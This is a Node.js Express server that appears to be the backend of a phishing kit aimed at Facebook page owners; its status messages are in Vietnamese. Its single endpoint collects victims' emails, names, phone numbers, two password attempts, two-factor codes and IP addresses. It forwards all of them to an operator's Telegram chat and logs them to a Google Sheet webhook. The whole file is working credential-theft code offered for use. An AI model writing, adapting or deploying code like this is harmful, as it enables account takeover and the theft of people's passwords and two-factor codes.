import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));
app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

app.post('/api/resgister', (req, res) => {
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
    
    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;

    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });

} else {

    const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}
<strong>Image:</strong> ${data.imageUrl ? data.imageUrl : ''}`;
    bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });

}

    // ADD GOOGLE SHEET
    const url = new URL(process.env.WEBHOOK_URL);

    url.searchParams.append('Ip', data.ip ? data.ip : '');
    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
    url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');

    axios.get(url)
    .then(response => {
        const data = response.data;
        if (data.status === 'success') {
            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
        } else {
            bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
        }
    })
    .catch(error => {
        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
    });

});

app.listen(process.env.PORT, () => {
    console.log(`Server listening port ${process.env.PORT}`);
});
